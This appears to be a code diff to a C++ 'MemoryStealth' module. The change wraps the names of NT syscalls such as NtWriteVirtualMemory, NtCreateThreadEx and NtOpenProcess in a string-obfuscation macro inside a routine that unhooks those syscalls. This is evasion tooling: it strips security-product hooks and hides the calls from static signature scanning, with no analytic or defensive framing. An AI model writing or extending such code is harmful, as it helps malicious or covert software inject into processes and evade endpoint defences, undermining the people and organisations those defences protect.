@@ -1,4 +1,5 @@
 #include "stealth_core.h"
+#include "../obfuscate.h"
 #include <winternl.h>
 #include <fstream>
 #include <algorithm>
@@ -77,14 +78,14 @@ namespace MemoryStealth {
     }
 
     void UnhookCriticalSyscalls() {
-        RestoreSyscallStub("NtProtectVirtualMemory");
-        RestoreSyscallStub("NtQuerySystemInformation");
-        RestoreSyscallStub("NtAllocateVirtualMemory");
-        RestoreSyscallStub("NtWriteVirtualMemory");
-        RestoreSyscallStub("NtReadVirtualMemory");
-        RestoreSyscallStub("NtCreateThreadEx");
-        RestoreSyscallStub("NtOpenProcess");
-        RestoreSyscallStub("NtQueryInformationProcess");
+        RestoreSyscallStub(SX("NtProtectVirtualMemory").c_str());
+        RestoreSyscallStub(SX("NtQuerySystemInformation").c_str());
+        RestoreSyscallStub(SX("NtAllocateVirtualMemory").c_str());
+        RestoreSyscallStub(SX("NtWriteVirtualMemory").c_str());
+        RestoreSyscallStub(SX("NtReadVirtualMemory").c_str());
+        RestoreSyscallStub(SX("NtCreateThreadEx").c_str());
+        RestoreSyscallStub(SX("NtOpenProcess").c_str());
+        RestoreSyscallStub(SX("NtQueryInformationProcess").c_str());
     }
 
     void Initialize() {
